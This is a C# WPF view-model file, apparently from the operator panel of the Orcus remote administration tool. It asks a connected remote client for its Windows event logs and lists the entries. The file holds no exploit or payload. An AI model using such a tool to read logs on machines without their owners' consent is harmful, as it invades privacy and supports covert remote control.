using System;
using System.Windows;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Orcus.Administration.Commands.EventLog;
using Orcus.Administration.Core.CommandManagement.View;
using Orcus.Administration.FileExplorer.Utilities;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.EventLog;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CommandViewModels
{
    [MinimumClientVersion(12)]
    public class EventLogViewModel : CommandView
    {
        private EventLogCommand _command;
        private FastObservableCollection<EventLogEntry> _eventLogEntries;
        private EventLogType? _loadedEventLog;
        private RelayCommand<EventLogType> _refreshEventLogCommand;

        public override string Name { get; } = (string) Application.Current.Resources["EventLog"];
        public override Category Category { get; } = Category.System;

        public FastObservableCollection<EventLogEntry> EventLogEntries
        {
            get { return _eventLogEntries; }
            set { SetProperty(value, ref _eventLogEntries); }
        }

        public EventLogType? LoadedEventLog
        {
            get { return _loadedEventLog; }
            set { SetProperty(value, ref _loadedEventLog); }
        }

        public RelayCommand<EventLogType> RefreshEventLogCommand
        {
            get
            {
                return _refreshEventLogCommand ??
                       (_refreshEventLogCommand =
                           new RelayCommand<EventLogType>(parameter =>
                           {
                               if (LoadedEventLog == parameter && EventLogEntries.Count == 0)
                                   return;

                               _command.RequestEventLog(parameter,
                                   parameter == LoadedEventLog ? EventLogEntries.Count : 0);
                               LoadedEventLog = parameter;
                           }));
            }
        }

        protected override void InitializeView(IClientController clientController, ICrossViewManager crossViewManager)
        {
            _command = clientController.Commander.GetCommand<EventLogCommand>();
            _command.EventLogReceived += CommandOnEventLogReceived;
        }

        public override void LoadView(bool loadData)
        {
            RefreshEventLogCommand.Execute(EventLogType.System);
        }

        protected override ImageSource GetIconImageSource()
        {
            return
                new BitmapImage(new Uri("pack://application:,,,/Resources/Images/VisualStudio/EventLog.ico",
                    UriKind.Absolute));
        }

        private void CommandOnEventLogReceived(object sender, EventLogReceivedEventArgs eventLogReceivedEventArgs)
        {
            if (eventLogReceivedEventArgs.Index == 0 || EventLogEntries == null)
                EventLogEntries = new FastObservableCollection<EventLogEntry>(eventLogReceivedEventArgs.EventLogEntries);
            else
                EventLogEntries.AddItems(eventLogReceivedEventArgs.EventLogEntries);
        }
    }
}